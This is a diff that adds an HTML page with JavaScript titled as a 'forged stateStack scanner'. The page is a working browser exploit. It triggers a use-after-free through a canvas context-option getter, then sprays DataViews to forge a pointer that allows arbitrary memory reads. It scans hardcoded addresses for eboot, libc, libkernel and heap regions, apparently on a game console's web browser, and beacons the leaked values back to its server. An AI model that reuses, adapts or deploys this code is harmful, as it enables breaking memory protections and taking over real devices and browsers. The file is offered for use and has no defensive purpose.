@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V903</title></head>
+<body><pre id="out">V903 — ZigZag-calibrated forged stateStack scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V903-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function split(a){return [Math.floor(a/4294967296), a>>>0];}
+
+/*
+ * V903: v650 forge, targets calibrated with the 14.10 Lua-loader VM map
+ * (sys 674, upstream v652-v655 "ZigZag intel"):
+ *   eboot      0x06038800 0   (~1.5GB)
+ *   libc       0x0CA70000 0   (~3.4GB)
+ *   heap/mmap  0x310000000-0x312000000  (~12.5-13.3GB)  <- primary
+ *   libkernel  0x819B40000              (~34.8GB)
+ * Phase order: SceLibcHeap 1MB steps (33) -> eboot/libc/libkernel +-16MB 1MB
+ * (97) -> wide 512MB sweep over 1G-32G (62).  Drill +-1MB 64KB steps after a
+ * hit, same WebProcess.  ?r=1 resets the counter.
+ */
+
+var TARGETS = [];
+function addRegion(base64, span, step, tag) {
+  for (var o = -span; o <= span; o += step) {
+    var a = base64 + o;
+    if (a < 0) continue;
+    var hl = split(a);
+    TARGETS.push([hl[0], hl[1], tag + (o >= 0 ? '+' : '-') + (Math.abs(o)/1024/1024) + 'M']);
+  }
+}
+addRegion(0x310000000, 0x1000000, 0x100000, 'SceLibcHeap');   /* 33 */
+addRegion(0x060388000, 0x1000000, 0x100000, 'eboot');          /* 33 */
+addRegion(0x0CA700000, 0x800000,  0x100000, 'libc');           /* 17 */
+addRegion(0x819B40000, 0x800000,  0x100000, 'libkernel');      /* 17 */
+for (var g = 0x40000000; g <= 0x800000000; g += 0x20000000) {  /* 1G..32G @512M */
+  var hl = split(g);
+  TARGETS.push([hl[0], hl[1], 'wide-' + (g/1024/1024/1024) + 'G']);
+}
+
+var MAX_ATTEMPTS = TARGETS.length;
+var attempt = 0;
+try {
+  if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v903_attempt','0');
+  attempt = parseInt(localStorage.getItem('v903_attempt')) || 0;
+} catch(e) {}
+
+function uafCycle() {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) return null;
+  for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+  var dvs = [];
+  for (var s = 0; s < 200; s++) {
+    var ab = new ArrayBuffer(768);
+    dvs.push(new DataView(ab));
+  }
+  return { inner: innerCtx, dvs: dvs };
+}
+
+function forgeAndRead(cycle, tgtHi, tgtLo) {
+  for (var w = 0; w < cycle.dvs.length; w++) {
+    var dv = cycle.dvs[w];
+    dv.setUint32(112, tgtLo, true);
+    dv.setUint32(116, tgtHi, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+  }
+  var leaked = cycle.inner.lineWidth;
+  cycle.inner = null;
+  for (var c = 0; c < cycle.dvs.length; c++) {
+    cycle.dvs[c].setFloat64(112, 0, true);
+    cycle.dvs[c].setUint32(120, 0, true);
+    cycle.dvs[c].setUint32(124, 0, true);
+  }
+  return leaked;
+}
+
+function looksLikePtr(v) {
+  _f64[0] = v;
+  var hi = _u32[1];
+  return hi >= 0x00000001 && hi <= 0x00007FFF && _u32[0] !== 0;
+}
+
+bk('BOOT', 'attempt=' + attempt + '/' + MAX_ATTEMPTS);
+if (attempt >= MAX_ATTEMPTS) {
+  bk('EXHAUSTED', 'all-' + MAX_ATTEMPTS + '-crashed');
+  say('Exhausted');
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n=' + attempt + '|addr=' + tgtHex + '|' + tgtDesc);
+  try { localStorage.setItem('v903_attempt', String(attempt + 1)); } catch(e) {}
+
+  var cycle = uafCycle();
+  if (!cycle) { bk('FAIL', 'no-uaf'); say('UAF failed'); }
+  else {
+    bk('SPRAY', 'n=200|tgt=' + tgtHex);
+    var leaked = forgeAndRead(cycle, tgtHi, tgtLo);
+    var leakedHex = f2h(leaked);
+    bk('HIT', 'addr=' + tgtHex + '|lw=' + leaked + '|hex=' + leakedHex + '|ptr=' + looksLikePtr(leaked));
+    say('HIT ' + tgtHex + ' -> ' + leakedHex);
+
+    var drill = 0, ptrs = [];
+    for (var d = -16; d <= 16 && drill < 40; d++) {
+      if (d === 0) continue;
+      var off2 = tgtLo + d * 0x10000;
+      if (off2 < 0) continue;
+      var c2 = uafCycle();
+      if (!c2) break;
+      drill++;
+      try {
+        var v2 = forgeAndRead(c2, tgtHi, off2);
+        var h2 = f2h(v2);
+        var isPtr = looksLikePtr(v2);
+        if (isPtr) ptrs.push(tgtHex + '+' + (d*64) + 'K=' + h2);
+        bk(isPtr ? 'PTR' : 'DRILL', tgtHex.slice(0,-6) + ('00000' + off2.toString(16)).slice(-6) + '=' + h2);
+      } catch (e) { bk('DRILL-ERR', e.name); break; }
+    }
+    bk('DONE', 'attempt=' + attempt + '|drill=' + drill + (ptrs.length ? '|ptrs=' + ptrs.slice(0,8).join(',') : ''));
+    try { localStorage.setItem('v903_attempt', String(MAX_ATTEMPTS + 1)); localStorage.setItem('v903_hit', tgtHex + '|' + leakedHex); } catch(e) {}
+  }
+}
+</script></body></html>
